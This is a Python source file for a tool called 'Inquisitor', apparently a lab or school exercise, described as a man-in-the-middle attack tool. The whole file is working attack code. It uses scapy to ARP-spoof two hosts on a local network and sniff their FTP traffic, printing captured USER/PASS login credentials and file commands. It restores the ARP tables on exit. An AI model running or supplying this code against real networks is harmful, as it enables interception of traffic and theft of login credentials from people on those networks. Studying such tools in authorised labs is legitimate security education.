# attacker.py
import re
from scapy.all import ARP, Ether, sendp ,send, sniff, IP, TCP, Raw
from threading import Thread
import argparse
import ipaddress
import time


def parse_args():
    parser = argparse.ArgumentParser(description="Inquisitor : MiddleMan attack tool")
    parser.add_argument("IP_src", type=str, help="Source IPv4 address")
    parser.add_argument("IP_dst", type=str, help="Destination IPv4 address")
    parser.add_argument("MAC_src", type=str, help="Source MAC address")
    parser.add_argument("MAC_dst", type=str, help="Destination MAC address")

    args = parser.parse_args()

    def check_ip(ip):
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False

    if not (check_ip(args.IP_src) and ipaddress.ip_address(args.IP_src).version == 4):
        parser.error("IP-src must be a valid IPv4 address.")
    if not (check_ip(args.IP_dst) and ipaddress.ip_address(args.IP_dst).version == 4):
        parser.error("IP-dst must be a valid IPv4 address.")

    def is_valid_mac(mac):
        return re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", mac) is not None

    if not is_valid_mac(args.MAC_src):
        parser.error("MAC-src must be a valid MAC address.")
    if not is_valid_mac(args.MAC_dst):
        parser.error("MAC-dst must be a valid MAC address.")
    return parser.parse_args()


def spoof(src_ip, dst_ip, dst_mac):
    arp_packet = ARP(op=2, pdst=src_ip, hwdst=dst_mac, psrc=dst_ip)
    ether = Ether(dst=dst_mac)
    packet = ether / arp_packet
    sendp(packet, verbose=False)

def restore(src_ip, dst_ip, src_mac, dst_mac):
    arp_packet = ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    ether = Ether(dst=dst_mac)
    packet = ether / arp_packet
    sendp(packet, verbose=False)

def packet_callback(packet):
    if packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode(errors="ignore")
            if "USER" in payload or "PASS" in payload:
                print(f"[FTP LOGIN] {packet[IP].src} -> {packet[IP].dst}: {payload.strip()}")
            elif any(cmd in payload for cmd in ["LIST", "RETR", "STOR"]):
                print(f"[FTP CMD] {packet[IP].src} -> {packet[IP].dst}: {payload.strip()}")
        except:
            pass

def start_sniffing():
    sniff(filter="tcp port 21", prn=packet_callback, store=0)

def main():
    args = parse_args()
    print("[*] Starting ARP spoofing... Press Ctrl+C to stop.")
    sniffer_thread = Thread(target=start_sniffing, daemon=True)
    sniffer_thread.start()


    while True:
        try:
            spoof(args.IP_src, args.IP_dst, args.MAC_src)
            spoof(args.IP_dst, args.IP_src, args.MAC_dst)
            time.sleep(2)
        except KeyboardInterrupt:
            print("\n[!] Detected Ctrl+C. Restoring ARP tables...")
            restore(args.IP_src, args.IP_dst, args.MAC_src, args.MAC_dst)
            restore(args.IP_dst, args.IP_src, args.MAC_dst, args.MAC_src)
            print("[+] ARP tables restored. Exiting.")

            break


if __name__ == "__main__":
    main()
